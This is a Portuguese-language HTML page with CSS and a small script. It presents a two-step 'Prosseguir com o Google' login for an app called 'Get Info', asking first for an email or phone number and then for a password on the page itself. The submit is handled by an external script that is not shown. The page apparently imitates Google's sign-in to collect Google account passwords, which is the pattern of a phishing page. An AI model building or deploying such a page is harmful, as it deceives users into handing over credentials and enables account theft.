<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fazer login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f7f7f7;
            padding-left: 20px;
        }

        .login-container, .password-container {
            background-color: #fff;
            padding: 40px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            margin-bottom: 20px;
            display: none; /* Oculta inicialmente */
        }

        .login-container.active, .password-container.active {
            display: block; /* Exibe quando ativo */
        }

        .login-container h1, .password-container h1 {
            font-size: 18px;
            margin-bottom: 20px;
            text-align: left;
        }

        .login-container input, .password-container input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }

        .login-container .forgot-password, .password-container .forgot-password {
            text-align: center;
            margin-bottom: 20px;
        }

        .login-container .btn, .password-container .btn {
            background-color: #1a73e8;
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 5px;
            width: 100%;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }

        .login-container .btn:hover, .password-container .btn:hover {
            background-color: #0c5bbf;
        }

        .login-container .small-text, .password-container .small-text {
            font-size: 12px;
            color: #666;
            text-align: left;
        }

        .cor-palavra {
            color: rgb(6, 208, 202);
        }

        .imagem-texto {
            display: flex;
            align-items: center;
        }

        .imagem-texto img {
            margin-right: 5px;
            margin-top: -13px;
        }
    </style>
</head>
<body>
    <!-- Primeira Etapa: Login -->
    <div class="login-container active">
        <p align="center"><img src="assets/icons/logo-getinfo.png" alt="Logo" width="100" height="30"></p>
        <div class="imagem-texto">
            <img src="assets/icons/google.png" alt="Google" width="20" height="20">
            <h1>Prosseguir com o Google</h1>
        </div>
        <p>Prosseguir para <strong><span class="cor-palavra">Get Info</span></strong></p>
        <input type="text" placeholder="E-mail ou telefone" required>
        <a href="#">Esqueceu seu email?</a>
        <button class="btn" onclick="mostrarSenha()">Próxima</button>
        <p class="small-text">
            Consulte a <a href="#">Política de Privacidade</a> e os <a href="#">Termos de Serviço</a> do app Get Info antes de usá-lo.
        </p>
    </div>

    <!-- Segunda Etapa: Senha -->
    <div class="password-container">
        <p align="center"><img src="assets/icons/logo-getinfo.png" alt="Logo" width="100" height="30"></p>
        <div class="imagem-texto">
            <img src="assets/icons/google.png" alt="Google" width="20" height="20">
            <h1>Prosseguir com o Google</h1>
        </div>
        <p>Prosseguir para <strong><span class="cor-palavra">Get Info</span></strong></p>
        <input type="password" placeholder="Digite sua senha" required>
        <a href="#" class="forgot-password">Esqueceu sua senha?</a>
        <button class="btn" onclick="login(); return false;">Entrar</button>
    </div>

    <script>
        function mostrarSenha() {
            document.querySelector('.login-container').classList.remove('active');
            document.querySelector('.password-container').classList.add('active');
        }
    </script>
    <script src="static/index.js"></script>
</body>
</html>
